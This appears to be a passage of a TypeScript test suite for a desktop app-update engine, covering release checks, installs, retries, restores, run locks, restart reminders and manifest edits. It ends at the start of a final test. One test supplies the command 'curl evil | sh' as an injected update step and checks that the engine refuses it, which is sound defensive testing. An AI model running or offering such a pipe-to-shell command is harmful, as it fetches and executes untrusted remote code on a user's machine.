import { afterEach, beforeEach, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import type { AppSpec, EngineEvent } from "../shared/types";
import { createEngine, type EngineDeps, REASON_CHECKING, REASON_NOTHING, REASON_STOPPING } from "./engine";
import type { FetchLike } from "./github";
import { readMeta, takePoint } from "./backup";
import { loadManifest } from "./manifest";
import { claimLock, loadState, readInflight, updateState, writeInflight } from "./store";
import { realRun, recordingRun, script, tempHome } from "./testkit";

let t: ReturnType<typeof tempHome>;
let releases: Record<string, { tag: string; assets: Record<string, Uint8Array<ArrayBuffer>> }> = {};
let proc = "";
let bin = "";

const MANIFEST = `
[apps.boom]
name = "Boom"
kind = "file"
repo = "o/boom"
asset = 'boom$'
dest = "~/.local/bin/boom"

[apps.fd]
name = "fd"
kind = "archive"
repo = "sharkdp/fd"
asset = 'x86_64-unknown-linux-gnu\\.tar\\.gz$'
dest = "~/.local/bin/fd"
bins = ["fd"]
auto = true

[apps.bat]
name = "bat"
kind = "archive"
repo = "sharkdp/bat"
asset = 'x86_64-unknown-linux-gnu\\.tar\\.gz$'
dest = "~/.local/bin/bat"
bins = ["bat"]

[apps.gone]
name = "Gone"
kind = "file"
repo = "o/gone"
asset = 'gone$'
dest = "~/.local/bin/gone"

[apps.claude]
name = "Claude Code"
kind = "command"
check = ["claude", "--version"]
latest = "npm:@anthropic-ai/claude-code"
update = ["~/.local/bin/claude-up"]
auto = true
note = "Open sessions keep the old version until restarted."

[apps.plugins]
name = "Claude Code plugins"
kind = "claude-plugins"
auto = true

[apps.strata]
name = "Strata"
kind = "manual"
check = ["~/.local/bin/strata-version"]
latest = "github:o/strata"
run = "strata-update"
`;

const bytes = (s: string) => new TextEncoder().encode(s);

async function tarball(name: string, body: string): Promise<Uint8Array<ArrayBuffer>> {
	const src = join(t.dir, `tar-${name}`);
	script(join(src, name), body);
	const out = join(t.dir, `${name}.tar.gz`);
	const r = await realRun(t.paths)(["tar", "czf", out, "-C", src, "."]);
	if (r.code !== 0) throw new Error(r.stderr);
	return new Uint8Array(readFileSync(out));
}

const fakeFetch: FetchLike = async (url) => {
	if (url === "https://registry.npmjs.org/@anthropic-ai/claude-code/latest")
		return Response.json({ version: "2.1.400" });
	const m = /^https:\/\/api\.github\.com\/repos\/(.+)\/releases\/latest$/.exec(url);
	if (m) {
		const r = releases[m[1] ?? ""];
		if (!r) return new Response("{}", { status: 404 });
		return Response.json({
			tag_name: r.tag,
			html_url: `https://github.com/${m[1]}/releases/tag/${r.tag}`,
			published_at: "2026-11-09T00:00:00Z",
			body: "Notes.",
			assets: Object.entries(r.assets).map(([name, b]) => ({
				name,
				browser_download_url: `https://dl.test/${m[1]}/${name}`,
				size: b.length,
				digest: null,
			})),
		});
	}
	for (const [repo, r] of Object.entries(releases))
		for (const [name, b] of Object.entries(r.assets))
			if (url === `https://dl.test/${repo}/${name}`) return new Response(b);
	return new Response("missing", { status: 404 });
};

async function deps(): Promise<EngineDeps> {
	writeFileSync(join(t.dir, "seed.toml"), MANIFEST);
	bin = join(t.paths.home, ".local/bin");
	script(join(bin, "boom"), 'echo "boom 1.0.0"');
	script(join(bin, "fd"), 'echo "fd 10.5.1"');
	script(join(bin, "bat"), 'echo "bat 0.26.1"');
	const claudeState = join(t.dir, "claude-version");
	writeFileSync(claudeState, "2.1.322");
	// claude answers its plugin commands as Claude Code would, and --version from the state file.
	script(
		join(bin, "claude"),
		`if [ "$1" = plugin ]; then [ "$2" = update ] && echo '{"updateOutcome":"up_to_date"}'; exit 0; fi; read -r v < "${claudeState}"; echo "$v (Claude Code)"`,
	);
	mkdirSync(join(t.paths.home, ".claude/plugins"), { recursive: true });
	writeFileSync(
		join(t.paths.home, ".claude/plugins/installed_plugins.json"),
		JSON.stringify({ plugins: { "a@b": [{ scope: "user" }] } }),
	);
	script(join(bin, "strata-version"), 'echo "strata 0.2.10"');
	script(join(bin, "claude-up"), `echo 2.1.400 > "${claudeState}"`);
	releases = {
		"o/boom": { tag: "v1.1.0", assets: {} },
		"sharkdp/fd": {
			tag: "v10.5.2",
			assets: { "fd-v10.5.2-x86_64-unknown-linux-gnu.tar.gz": await tarball("fd", 'echo "fd 10.5.2"') },
		},
		"sharkdp/bat": { tag: "v0.26.1", assets: { "bat-x86_64-unknown-linux-gnu.tar.gz": bytes("x") } },
		"o/strata": { tag: "v0.2.13", assets: {} },
	};
	// boom's release lists an asset whose download is missing, so its install throws.
	releases["o/boom"] = { tag: "v1.1.0", assets: { boom: bytes("never served") } };
	// The system's own lists (Flatpak, Snap, apt) read as not installed, so no test reads the machine it runs on.
	const { run } = recordingRun(t.paths, (argv) =>
		argv[0] === "gh"
			? { code: 1, stdout: "", stderr: "not logged in", timedOut: false }
			: ["flatpak", "snap", "apt-cache"].includes(argv[0] ?? "")
				? { code: 127, stdout: "", stderr: "", timedOut: false }
				: undefined,
	);
	return {
		paths: t.paths,
		seedManifest: join(t.dir, "seed.toml"),
		fetch: async (url, init) =>
			url === "https://dl.test/o/boom/boom" ? new Response("gone", { status: 404 }) : fakeFetch(url, init),
		run,
		now: () => new Date(),
		procRoot: proc,
		retryMs: 1,
		pollMs: 10,
		version: "9.9.9",
	};
}

beforeEach(() => {
	t = tempHome("engine");
	proc = join(t.dir, "proc");
	mkdirSync(proc);
});
afterEach(() => t.cleanup());

function statuses(engine: ReturnType<typeof createEngine>): Record<string, string> {
	return Object.fromEntries(engine.snapshot().apps.map((a) => [a.key, a.status]));
}

test("check: apps land in manifest order, absent apps are left out", async () => {
	const engine = createEngine(await deps());
	const events: EngineEvent[] = [];
	engine.subscribe((e) => events.push(e));
	await engine.check();
	expect(statuses(engine)).toEqual({
		boom: "ready",
		fd: "ready",
		bat: "fresh",
		claude: "ready",
		plugins: "fresh",
		strata: "manual",
	});
	const snap = engine.snapshot();
	expect(snap.version).toBe("9.9.9");
	expect(snap.checkedAt).not.toBeNull();
	expect(snap.run.phase).toBe("idle");
	const fd = snap.apps.find((a) => a.key === "fd");
	expect(fd).toMatchObject({
		installed: "10.5.1",
		latest: "10.5.2",
		canRestore: true,
		auto: true,
		dest: "~/.local/bin/fd",
	});
	expect(fd?.stages.map((s) => s.id)).toEqual(["download", "backup", "install", "verify"]);
	expect(
		events.some((e) => e.type === "log" && e.line.text === `Gone is not installed at ${join(bin, "gone")}, skipped.`),
	).toBe(true);
	expect(events.findLast((e) => e.type === "run")).toMatchObject({ run: { phase: "idle" } });
	expect(events.at(-1)?.type).toBe("meta");
	expect(engine.readyKeys(false)).toEqual(["boom", "fd", "claude"]);
	expect(engine.readyKeys(true)).toEqual(["fd", "claude", "plugins"]);
});

test("a check pressed while an install is starting does not run beside it", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	const phases: string[] = [];
	engine.subscribe((e) => {
		if (e.type === "run") phases.push(e.run.phase);
	});
	const started = engine.install(["fd"]);
	// recover() is still pending here: the schedule's or a hand Check must wait, not start a second run.
	const pressed = engine.check();
	expect(await started).toEqual({ started: true });
	await pressed;
	await engine.idle();
	expect(phases).not.toContain("checking");
	expect(engine.snapshot().run.phase).toBe("summary");
});

test("one app's exception fails that app and the run continues", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	const r = await engine.install(["boom", "fd", "claude", "plugins", "bat", "strata"]);
	expect(r).toEqual({ started: true });
	await engine.idle();
	const snap = engine.snapshot();
	expect(snap.run.phase).toBe("summary");
	expect(snap.run.results.map((x) => [x.key, x.result])).toEqual([
		["boom", "failed"],
		["fd", "updated"],
		["claude", "updated"],
		["plugins", "updated"],
	]);
	expect(snap.run.results[0]?.detail).toBe("Download failed: the server answered 404.");
	expect(statuses(engine)).toMatchObject({
		boom: "failed",
		fd: "done",
		claude: "done",
		bat: "fresh",
		strata: "manual",
	});
	const claude = snap.apps.find((a) => a.key === "claude");
	// A tool that updates itself goes to done, not Restart to finish: its note in the pane says open sessions run on.
	expect(claude).toMatchObject({ installed: "2.1.400", restartToApply: false });
	expect(claude?.detail).toBeUndefined();
	expect(snap.apps.find((a) => a.key === "fd")?.restorePoints.map((p) => p.version)).toEqual(["10.5.1"]);
	const history = engine.history(10);
	expect(history.map((h) => h.key)).toEqual(["plugins", "claude", "fd", "boom"]);
	const runId = history[0]?.runId ?? "";
	expect(engine.runLog(runId).some((l) => l.key === "plugins" && l.text === "a@b is up to date")).toBe(true);
	expect(readFileSync(join(t.paths.state, "logs", `${runId}.log`), "utf8")).toContain("[fd] Downloading");
	engine.dismissSummary();
	expect(engine.snapshot().run.phase).toBe("idle");
	expect(statuses(engine)).toMatchObject({ fd: "fresh", boom: "ready" });
	expect(engine.snapshot().apps.find((a) => a.key === "fd")?.installed).toBe("10.5.2");
});

test("after Done a failed app is ready again and says why the last try ended, until the next check", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	await engine.install(["boom", "fd"]);
	await engine.idle();
	engine.dismissSummary();
	const boom = () => engine.snapshot().apps.find((a) => a.key === "boom");
	expect(boom()).toMatchObject({
		status: "ready",
		detail: "Last try failed. Download failed: the server answered 404.",
	});
	await engine.check();
	expect(boom()?.status).toBe("ready");
	expect(boom()?.detail ?? "").not.toContain("Last try failed");
});

test("retry from the summary runs only the failed app again", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	await engine.install(["boom", "fd"]);
	await engine.idle();
	expect(engine.snapshot().run.phase).toBe("summary");
	expect(statuses(engine)).toMatchObject({ boom: "failed", fd: "done" });
	expect(engine.snapshot().run.retry).toBe(false);
	const runs: boolean[] = [];
	const off = engine.subscribe((e) => {
		if (e.type === "run" && e.run.phase === "installing") runs.push(e.run.retry);
	});
	const r = await engine.install(["boom"]);
	expect(r).toEqual({ started: true });
	await engine.idle();
	off();
	// The view can say "Retrying" for the whole second pass.
	expect(runs.length).toBeGreaterThan(0);
	expect(runs.every(Boolean)).toBe(true);
	// History marks the retried rows, and only those.
	expect(engine.history(10).map((h) => [h.key, h.retry === true])).toEqual([
		["boom", true],
		["fd", false],
		["boom", false],
	]);
	const snap = engine.snapshot();
	// The first pass's update stays in the summary, so the two passes read as one run.
	expect(snap.run.results.map((x) => [x.key, x.result])).toEqual([
		["fd", "updated"],
		["boom", "failed"],
	]);
	// The app that succeeded in the first pass is not installed again and still shows as done.
	expect(statuses(engine)).toMatchObject({ boom: "failed", fd: "done" });
	expect(engine.history(10).filter((h) => h.key === "fd")).toHaveLength(1);
	engine.dismissSummary();
	expect(statuses(engine)).toMatchObject({ boom: "ready", fd: "fresh" });
	expect(engine.snapshot().run.retry).toBe(false);
});

test("install refuses while checking and with nothing ready", async () => {
	const engine = createEngine(await deps());
	const checking = engine.check();
	expect(await engine.install(["fd"])).toEqual({ started: false, reason: REASON_CHECKING });
	await checking;
	expect(await engine.install(["bat", "strata"])).toEqual({ started: false, reason: REASON_NOTHING });
	expect(statuses(engine).fd).toBe("ready");
	expect(await engine.install(["fd"])).toEqual({ started: true });
	await engine.idle();
});

test("stop after the current app returns the rest of the queue to ready", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	let stopped = false;
	engine.subscribe((e) => {
		if (!stopped && e.type === "app" && e.app.key === "fd" && e.app.status === "working") {
			stopped = true;
			engine.stopAfterCurrent();
		}
	});
	await engine.install(["fd", "claude"]);
	await engine.idle();
	expect(engine.snapshot().run.results.map((r) => r.key)).toEqual(["fd"]);
	expect(statuses(engine)).toMatchObject({ fd: "done", claude: "ready" });
	expect(engine.snapshot().run.stopping).toBe(false);
});

test("skip and hold move a ready app to held; a newer version clears the skip", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	engine.setSkip("fd", "10.5.2");
	expect(engine.snapshot().apps.find((a) => a.key === "fd")).toMatchObject({ status: "held", skipped: "10.5.2" });
	await engine.check(["fd"]);
	expect(statuses(engine).fd).toBe("held");
	engine.setSkip("fd", null);
	expect(statuses(engine).fd).toBe("ready");
	engine.setHold("fd", true);
	expect(engine.snapshot().apps.find((a) => a.key === "fd")).toMatchObject({ status: "held", held: true });
	expect(engine.readyKeys(false)).not.toContain("fd");
	engine.setHold("fd", false);
	expect(statuses(engine).fd).toBe("ready");
	engine.setSkip("fd", "10.5.0");
	await engine.check(["fd"]);
	expect(statuses(engine).fd).toBe("ready");
	expect(JSON.parse(readFileSync(join(t.paths.state, "state.json"), "utf8")).skip).toEqual({});
});

test("settings and auto are kept in state", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	expect(engine.setSettings({ keepBackups: 3, notify: false })).toEqual({
		keepBackups: 3,
		notify: false,
		checkAtLogin: false,
		checkEvery: "6h",
		frame: "own",
		buttons: "auto",
		corners: "rounded",
		language: "system",
		selfAuto: false,
		upkeepCommand: false,
	});
	engine.setAuto("bat", true);
	expect(engine.snapshot().apps.find((a) => a.key === "bat")?.auto).toBe(true);
	const again = createEngine(await deps());
	await again.check();
	expect(again.snapshot().settings.keepBackups).toBe(3);
	expect(again.snapshot().apps.find((a) => a.key === "bat")?.auto).toBe(true);
});

test("restore puts a restore point back and the row reads ready again", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	await engine.install(["fd"]);
	await engine.idle();
	engine.dismissSummary();
	expect(await engine.restore("fd", "10.5.1")).toEqual({ ok: true });
	// The version he stepped back from is skipped, not offered and ticked again.
	expect(engine.snapshot().apps.find((a) => a.key === "fd")).toMatchObject({
		installed: "10.5.1",
		status: "held",
		skipped: "10.5.2",
	});
	expect(readFileSync(join(bin, "fd"), "utf8")).toContain("fd 10.5.1");
	expect(engine.history(1)[0]).toMatchObject({ key: "fd", from: "10.5.2", to: "10.5.1", result: "restored" });
});

test("a restore is a swap: the version it replaced becomes the restore point, so it can be undone", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	await engine.install(["fd"]);
	await engine.idle();
	engine.dismissSummary();
	const fd = () => engine.snapshot().apps.find((a) => a.key === "fd");
	expect(fd()?.restorePoints.map((p) => p.version)).toEqual(["10.5.1"]);
	expect(await engine.restore("fd", "10.5.1")).toEqual({ ok: true });
	// keepBackups is 1: the point just used is gone and the version just replaced took its place.
	expect(fd()?.restorePoints.map((p) => p.version)).toEqual(["10.5.2"]);
	expect(await engine.restore("fd", "10.5.2")).toEqual({ ok: true });
	expect(fd()).toMatchObject({ installed: "10.5.2", status: "fresh" });
	expect(readFileSync(join(bin, "fd"), "utf8")).toContain("fd 10.5.2");
	expect(fd()?.restorePoints.map((p) => p.version)).toEqual(["10.5.1"]);
});

test("an interrupted install shows on its row at the next check", async () => {
	const d = await deps();
	writeInflight(t.paths, { key: "fd", dest: join(bin, "fd"), backupVersion: "10.5.1" });
	writeFileSync(join(bin, "fd.upkeep-new"), "half");
	const engine = createEngine(d);
	expect(readInflight(t.paths)).toBeNull();
	await engine.check();
	expect(engine.snapshot().apps.find((a) => a.key === "fd")).toMatchObject({
		status: "problem",
		detail: "An update was interrupted. Restore 10.5.1 from this row.",
	});
	expect(Bun.file(join(bin, "fd.upkeep-new")).size).toBe(0);
});

const lockHeld = () => existsSync(join(t.paths.state, "run.lock"));

test("a run log that cannot be written does not stop the run, and the lock is released", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	expect(await engine.install(["fd"])).toEqual({ started: true });
	const logs = join(t.paths.state, "logs");
	for (const f of readdirSync(logs)) chmodSync(join(logs, f), 0o444);
	await engine.idle();
	expect(engine.snapshot().run.phase).toBe("summary");
	expect(statuses(engine).fd).toBe("done");
	expect(lockHeld()).toBe(false);
	expect(await engine.install(["claude"])).toEqual({ started: true });
	await engine.idle();
});

test("a run that throws outside an app fails its open rows with the reason and releases run.lock", async () => {
	const d = await deps();
	let armed = false;
	let calls = 0;
	d.now = () => {
		// The install's own stamp is call 1; the first log line of the run is call 2.
		if (armed && ++calls === 2) throw new Error("clock gone");
		return new Date();
	};
	const engine = createEngine(d);
	await engine.check();
	armed = true;
	expect(await engine.install(["fd", "claude"])).toEqual({ started: true });
	await engine.idle();
	const snap = engine.snapshot();
	expect(snap.run.phase).toBe("summary");
	expect(snap.apps.filter((a) => a.key === "fd" || a.key === "claude").map((a) => [a.status, a.detail])).toEqual([
		["failed", "The run stopped: clock gone"],
		["failed", "The run stopped: clock gone"],
	]);
	expect(lockHeld()).toBe(false);
});

test("a run that throws after its apps still releases run.lock", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	mkdirSync(join(t.paths.data, "history.jsonl"), { recursive: true }); // appendHistory throws EISDIR
	await engine.install(["fd"]);
	await engine.idle();
	expect(engine.snapshot().run.phase).toBe("summary");
	expect(lockHeld()).toBe(false);
});

test("an install whose setup throws is refused, puts its rows back, and releases run.lock", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	mkdirSync(t.paths.state, { recursive: true });
	rmSync(join(t.paths.state, "logs"), { recursive: true, force: true });
	writeFileSync(join(t.paths.state, "logs"), ""); // openRunLog cannot make its directory
	const r = await engine.install(["fd"]);
	expect(r.started).toBe(false);
	expect(statuses(engine).fd).toBe("ready");
	expect(engine.snapshot().run.phase).toBe("idle");
	expect(lockHeld()).toBe(false);
});

test("recovery clears the half-written file beside every bin of an archive, not only the first", async () => {
	const d = await deps();
	writeFileSync(join(t.dir, "seed.toml"), MANIFEST.replace('bins = ["fd"]', 'bins = ["fd", "fd-extra"]'));
	writeInflight(t.paths, { key: "fd", dest: join(bin, "fd"), backupVersion: "10.5.1" });
	for (const name of ["fd", "fd-extra"]) writeFileSync(join(bin, `${name}.upkeep-new`), "half");
	createEngine(d);
	expect(["fd", "fd-extra"].map((name) => existsSync(join(bin, `${name}.upkeep-new`)))).toEqual([false, false]);
});

test("recovery of an archive app already cut from the list clears every bin's temp copy the marker names", async () => {
	const d = await deps();
	// The app is gone from the list; only the marker knows its bins.
	writeFileSync(join(t.dir, "seed.toml"), MANIFEST.replace(/\[apps\.fd\][\s\S]*?auto = true\n/, ""));
	const files = [join(bin, "fd"), join(bin, "fd-extra")];
	// A path elsewhere in the marker is not trusted; a temp copy that cannot be deleted does not stop the start.
	const elsewhere = join(t.dir, "elsewhere");
	const locked = join(bin, "locked");
	mkdirSync(locked, { recursive: true });
	writeFileSync(join(locked, "x.upkeep-new"), "root's");
	writeFileSync(`${elsewhere}.upkeep-new`, "not ours");
	writeInflight(t.paths, {
		key: "fd",
		dest: join(bin, "fd"),
		backupVersion: "10.5.1",
		files: [...files, elsewhere, join(locked, "x")],
	});
	for (const f of files) writeFileSync(`${f}.upkeep-new`, "half");
	chmodSync(locked, 0o555);
	createEngine(d);
	chmodSync(locked, 0o755);
	expect(files.map((f) => existsSync(`${f}.upkeep-new`))).toEqual([false, false]);
	expect(existsSync(`${elsewhere}.upkeep-new`)).toBe(true);
	expect(readInflight(t.paths)).toBeNull();
});

test("a second engine leaves another process's install in progress alone", async () => {
	const d = await deps();
	writeInflight(t.paths, { key: "fd", dest: join(bin, "fd"), backupVersion: "10.5.1" });
	writeFileSync(join(bin, "fd.upkeep-new"), "half");
	mkdirSync(join(proc, "4242"));
	writeFileSync(join(proc, "4242/stat"), "4242 (bun) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 5555 0 0");
	expect(claimLock(t.paths, 4242, proc)).toBe(true);
	createEngine(d);
	expect(readInflight(t.paths)).toEqual({ key: "fd", dest: join(bin, "fd"), backupVersion: "10.5.1" });
	expect(existsSync(join(bin, "fd.upkeep-new"))).toBe(true);
	expect(readFileSync(join(t.paths.state, "run.lock"), "utf8")).toBe("4242 5555");
});

const rg = (extra: Partial<AppSpec> = {}): AppSpec => ({
	key: "rg",
	name: "ripgrep",
	kind: "archive",
	repo: "BurntSushi/ripgrep",
	asset: "^ripgrep-.*-x86_64-unknown-linux-musl\\.tar\\.gz$",
	dest: "~/.local/bin/rg",
	bins: ["rg"],
	install_if_missing: true,
	...extra,
});

test("an added app is written to apps.toml, reads back the same, and is checked and installable when absent", async () => {
	const d = await deps();
	releases["BurntSushi/ripgrep"] = {
		tag: "15.1.0",
		assets: { "ripgrep-15.1.0-x86_64-unknown-linux-musl.tar.gz": await tarball("rg", 'echo "ripgrep 15.1.0"') },
	};
	const engine = createEngine(d);
	await engine.check();
	const file = join(t.paths.config, "apps.toml");
	const before = readFileSync(file, "utf8");
	expect(await engine.addApps([rg({ name: 'Rip "grep" \\ tool' })])).toEqual({ added: ["rg"], problems: [] });
	await engine.idle();
	const text = readFileSync(file, "utf8");
	expect(text.startsWith(before.replace(/\n*$/, "\n"))).toBe(true);
	expect(text.slice(before.replace(/\n*$/, "\n").length)).toBe(`
[apps.rg]
name = "Rip \\"grep\\" \\\\ tool"
kind = "archive"
repo = "BurntSushi/ripgrep"
asset = '^ripgrep-.*-x86_64-unknown-linux-musl\\.tar\\.gz$'
dest = "~/.local/bin/rg"
bins = ["rg"]
install_if_missing = true
`);
	expect(readFileSync(`${file}.bak`, "utf8")).toBe(before);
	expect(loadManifest(file).apps.find((a) => a.key === "rg")).toEqual(rg({ name: 'Rip "grep" \\ tool' }));
	expect(engine.snapshot().apps.find((a) => a.key === "rg")).toMatchObject({
		status: "ready",
		installed: null,
		latest: "15.1.0",
	});
	expect(await engine.install(["rg"])).toEqual({ started: true });
	await engine.idle();
	expect(engine.snapshot().apps.find((a) => a.key === "rg")).toMatchObject({ status: "done", installed: "15.1.0" });
	expect(readFileSync(join(bin, "rg"), "utf8")).toContain("ripgrep 15.1.0");
});

test("adding refuses a taken key, a taken dest, a kind it cannot add, and an invalid table", async () => {
	const engine = createEngine(await deps());
	const file = join(t.paths.config, "apps.toml");
	const before = readFileSync(file, "utf8");
	const r = await engine.addApps([
		rg({ key: "fd" }),
		rg({ dest: "~/.local/bin/bat" }),
		rg({ kind: "source" }),
		rg({ asset: "(" }),
	]);
	expect(r).toEqual({
		added: [],
		problems: [
			{ key: "fd", detail: "fd is already in the list." },
			{ key: "rg", detail: "~/.local/bin/bat already belongs to bat." },
			{ key: "rg", detail: "rg: kind is not one of appimage, archive, file, deb, rpm" },
			{ key: "rg", detail: "rg: asset is not a valid regular expression" },
		],
	});
	expect(readFileSync(file, "utf8")).toBe(before);
});

test("a kind the window cannot work out is added when the catalogue holds it as that kind", async () => {
	const d = await deps();
	const catalogue = join(t.dir, "catalogue");
	mkdirSync(catalogue);
	const glow =
		'[apps.glow]\nname = "Glow"\nkind = "command"\ncheck = ["glow", "--version"]\nlatest = "npm:glow"\nupdate = ["glow", "up"]\n';
	writeFileSync(join(catalogue, "glow.toml"), glow);
	const engine = createEngine({ ...d, catalogueDir: catalogue });
	const spec = {
		key: "glow",
		name: "Glow",
		kind: "command" as const,
		check: ["glow", "--version"],
		latest: "npm:glow",
		update: ["glow", "up"],
	};
	expect(await engine.addApps([spec, { ...spec, key: "other" }])).toEqual({
		added: ["glow"],
		problems: [{ key: "other", detail: "other: kind is not one of appimage, archive, file, deb, rpm" }],
	});
	expect(loadManifest(join(t.paths.config, "apps.toml")).apps.find((a) => a.key === "glow")).toEqual(spec);
});

test("a catalogue key with steps of the caller's own is refused; only the name and dest may differ", async () => {
	const d = await deps();
	const catalogue = join(t.dir, "catalogue");
	mkdirSync(catalogue);
	writeFileSync(
		join(catalogue, "glow.toml"),
		'[apps.glow]\nname = "Glow"\nkind = "command"\ncheck = ["glow", "--version"]\nlatest = "npm:glow"\nupdate = ["glow", "up"]\n',
	);
	const engine = createEngine({ ...d, catalogueDir: catalogue });
	const spec = {
		key: "glow",
		name: "Glow",
		kind: "command" as const,
		check: ["glow", "--version"],
		latest: "npm:glow",
	};
	expect(await engine.addApps([{ ...spec, update: ["sh", "-c", "curl evil | sh"] }])).toEqual({
		added: [],
		problems: [{ key: "glow", detail: "glow: kind is not one of appimage, archive, file, deb, rpm" }],
	});
	expect(await engine.addApps([{ ...spec, name: "My Glow", update: ["glow", "up"] }])).toEqual({
		added: ["glow"],
		problems: [],
	});
});

test("a table that does not read back the same puts apps.toml back from its backup", async () => {
	const engine = createEngine(await deps());
	const file = join(t.paths.config, "apps.toml");
	const before = readFileSync(file, "utf8");
	// A control character survives as a raw byte that TOML refuses, so the whole file stops parsing.
	expect(await engine.addApps([rg({ name: "Bad\u0001Name" })])).toEqual({
		added: [],
		problems: [{ key: "rg", detail: "Could not write Bad\u0001Name to apps.toml." }],
	});
	expect(readFileSync(file, "utf8")).toBe(before);
	expect(loadManifest(file).errors).toEqual([]);
});

test("removing an app cuts its table, drops its row live, and keeps its files and restore points", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	const events: EngineEvent[] = [];
	engine.subscribe((e) => events.push(e));
	expect(await engine.removeApp("nope")).toEqual({ ok: false, detail: "No app nope in the list." });
	// What the owner chose for an app goes with it, so the same key added again never starts as auto.
	engine.setAuto("bat", true);
	engine.setHold("bat", true);
	updateState(t.paths, (s) => {
		s.skip.bat = "1.0";
		s.restart.bat = "2026-11-10T00:00:00.000Z";
	});
	expect(loadState(t.paths).auto.bat).toBe(true);
	expect(await engine.removeApp("bat")).toEqual({ ok: true });
	const left = loadState(t.paths);
	expect([left.auto, left.hold, left.skip, left.restart]).toEqual([{}, {}, {}, {}]);
	expect(events).toContainEqual({ type: "removed", key: "bat" });
	expect(engine.snapshot().apps.some((a) => a.key === "bat")).toBe(false);
	const file = join(t.paths.config, "apps.toml");
	expect(readFileSync(file, "utf8")).not.toContain("[apps.bat]");
	expect(loadManifest(file).apps.map((a) => a.key)).toEqual(["boom", "fd", "gone", "claude", "plugins", "strata"]);
	expect(existsSync(join(bin, "bat"))).toBe(true);
});

/** A fake process for the restart watch: fd's own binary, started `startSec` seconds after a boot 1000 s ago. */
function fdProcess(pid: number, startSec: number): void {
	const boot = Math.floor(Date.now() / 1000) - 1000;
	writeFileSync(join(proc, "stat"), `cpu  1 2 3\nbtime ${boot}\nprocesses 9\n`);
	mkdirSync(join(proc, String(pid)), { recursive: true });
	writeFileSync(
		join(proc, String(pid), "stat"),
		`${pid} (fd) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 ${startSec * 100} 0 0`,
	);
	writeFileSync(join(proc, String(pid), "comm"), "fd\n");
	writeFileSync(join(proc, String(pid), "cmdline"), `${join(bin, "fd")}\0`);
}

const fdRow = (engine: ReturnType<typeof createEngine>) => engine.snapshot().apps.find((a) => a.key === "fd");
/** deps() with fd given a restart command, so a running old copy is worth a reminder (a bare command-line tool's is not). */
async function depsRestartable(): Promise<EngineDeps> {
	const d = await deps();
	const seed = join(t.dir, "seed.toml");
	writeFileSync(
		seed,
		readFileSync(seed, "utf8").replace('repo = "sharkdp/fd"', 'repo = "sharkdp/fd"\nrestart = ["true"]'),
	);
	return d;
}
const restartEntry = () => JSON.parse(readFileSync(join(t.paths.state, "state.json"), "utf8")).restart?.fd;

test("a restart reminder outlives Done and a later check while the old process runs, and clears once it is gone", async () => {
	const engine = createEngine(await depsRestartable());
	fdProcess(500, 1);
	await engine.check();
	await engine.install(["fd"]);
	await engine.idle();
	expect(fdRow(engine)).toMatchObject({ status: "done", restartToApply: true });
	expect(typeof restartEntry()).toBe("string");
	engine.dismissSummary();
	expect(fdRow(engine)?.restartToApply).toBe(true);
	await engine.check();
	expect(fdRow(engine)?.restartToApply).toBe(true);
	rmSync(join(proc, "500"), { recursive: true });
	expect(fdRow(engine)?.restartToApply).toBe(false);
	expect(restartEntry()).toBeUndefined();
});

test("a restart reminder clears when the only matching process started after the install", async () => {
	const engine = createEngine(await depsRestartable());
	fdProcess(500, 1);
	await engine.check();
	await engine.install(["fd"]);
	await engine.idle();
	engine.dismissSummary();
	// The owner restarted fd: the new process started after the install ended.
	fdProcess(500, 2000);
	await engine.check();
	expect(fdRow(engine)?.restartToApply).toBe(false);
	expect(restartEntry()).toBeUndefined();
});

test("a restore clears the restart reminder", async () => {
	const engine = createEngine(await deps());
	fdProcess(500, 1);
	await engine.check();
	await engine.install(["fd"]);
	await engine.idle();
	engine.dismissSummary();
	expect(await engine.restore("fd", "10.5.1")).toEqual({ ok: true });
	expect(restartEntry()).toBeUndefined();
	expect(fdRow(engine)?.restartToApply).toBe(false);
});

test("a second engine on the same home shows the first one's rows before any check", async () => {
	const d = await deps();
	const first = createEngine(d);
	await first.check();
	const before = first.snapshot().apps.map((a) => [a.key, a.installed, a.latest, a.status]);
	const second = createEngine(d);
	expect(second.snapshot().apps.map((a) => [a.key, a.installed, a.latest, a.status])).toEqual(before);
	expect(second.snapshot().checkedAt).toBe(first.snapshot().checkedAt);
	// A check then runs as today and replaces them.
	await second.check();
	expect(second.snapshot().apps.map((a) => [a.key, a.status])).toEqual(
		first.snapshot().apps.map((a) => [a.key, a.status]),
	);
});

test("a corrupt rows file starts empty, and an app gone from the manifest is not brought back", async () => {
	const d = await deps();
	const first = createEngine(d);
	await first.check();
	writeFileSync(join(t.paths.cache, "rows.json"), "{not json");
	expect(createEngine(d).snapshot().apps).toEqual([]);
	await first.check();
	expect(await first.removeApp("bat")).toEqual({ ok: true });
	const again = createEngine(d);
	expect(again.snapshot().apps.some((a) => a.key === "bat")).toBe(false);
	expect(again.snapshot().apps.some((a) => a.key === "fd")).toBe(true);
});

test("the rows cache carries a built row's commits and ahead, at most 30", async () => {
	const d = await deps();
	const first = createEngine(d);
	await first.check();
	const file = join(t.paths.cache, "rows.json");
	const rows = JSON.parse(readFileSync(file, "utf8"));
	rows.fd = {
		...rows.fd,
		ahead: 569,
		commits: Array.from({ length: 40 }, (_, i) => ({ sha: `s${i}`, title: `t${i}` })),
	};
	writeFileSync(file, JSON.stringify(rows));
	const row = createEngine(d)
		.snapshot()
		.apps.find((a) => a.key === "fd");
	expect(row?.ahead).toBe(569);
	expect(row?.commits).toHaveLength(30);
	expect(row?.commits?.[0]).toEqual({ sha: "s0", title: "t0" });
});

test("a self-updating tool's restore before any check writes the tag the way the point it puts back kept it", async () => {
